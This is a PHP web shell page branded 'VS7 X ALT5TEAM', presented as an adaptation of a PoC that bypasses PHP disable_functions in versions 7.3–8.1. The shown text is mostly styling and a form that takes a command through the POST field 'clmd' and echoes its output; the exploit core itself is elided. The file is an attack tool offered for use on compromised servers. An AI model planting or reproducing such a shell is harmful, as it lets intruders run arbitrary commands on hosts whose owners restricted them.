<?php
# Exploit Title: PHP 7.3–8.1 disable_functions Bypass PoC (Linux only)
# Vulnerability: https://bugs.php.net/bug.php?id=81705
# Affected Versions: PHP 7.3 – PHP 8.1 (as of 2022-01-07)
# Original Author: mm0r1 (https://github.com/mm0r1)
# Recode/Adaptation: ALT 5 TEAM
# Tested On: Kali Linux / Debian / Ubuntu
echo "
<html>
<head>
<link href='https://s14.gifyu.com/images/bTDXv.png' rel='icon' type='image/x-icon'/>
<title>.:𖣔 VS7 X ALT5TEAM 𖣔:.</title>
    ...
    <style>
        body {
            background-image: url('https://s14.gifyu.com/images/bTDXo.gif');
            color: black;
            background-repeat: no-repeat;
            background-size: cover;      /* bikin gambar cover penuh */
        ...
        .jurus {
            ...
            color: black;
            font-weight: bold;
            text-shadow: 1px 1px 15px #cc0000;
            text-align: center;
        }
        .jurus1 {
            font-family: 'Allerta Stencil', sans-serif;
...
<body>
    <br><br><br>
    <div class='jurus'>V E A S S 7<br>COMMAND BYPASS</div>
    <br><br><br>

    <div class='form-wrapper'>
        <form name='clmd' method='POST' enctype='multipart/form-data'>
            <input type='text' name='clmd' class='form-control form-control1 mb-3' placeholder='Masukkan perintah...'>
        </form>
";
...
if (isset($_POST['clmd'])) {
    ...
    echo "
        <textarea class='form-control form-control1' rows='10' readonly style='background-color: #2d353c; color: #cc0000;'>" . 
...
echo "
        ...
        <div class='red-text'>Ini hanya untuk bypass disable_functions PHP 7.*</div>
        <br>
        <div class='jurus1'>ALL RIGHT RESERVED © ALT 5 TEAM</div>
    </div> <!-- form-wrapper -->
